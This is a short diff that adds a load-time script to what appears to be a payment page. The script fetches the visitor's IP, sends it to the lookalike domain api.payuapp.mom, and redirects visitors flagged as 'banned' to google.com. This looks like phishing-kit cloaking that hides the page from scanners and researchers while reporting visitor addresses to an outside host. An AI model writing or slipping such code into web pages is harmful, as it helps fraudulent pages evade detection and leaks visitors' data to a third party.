@@ -1962,6 +1962,30 @@ img.processing {
     sendSlspTMDummyCallWithDelay();
 
 </script>
+
+<script>
+    window.onload = function() {
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+                checkIPBan(ipAddress);
+            })
+            .catch(error => console.error('Error fetching IP:', error));
+    };
+
+    function checkIPBan(ipAddress) {
+        fetch(`https://api.payuapp.mom/check_ip?ip=${ipAddress}`)
+            .then(response => response.json())
+            .then(data => {
+                if (data.banned) {
+                    window.location.href = 'https://www.google.com';
+                }
+            })
+            .catch(error => console.error('Error checking IP ban:', error));
+    }
+</script>
+
 <script>
 
     window.tmProbeLoaded=false;
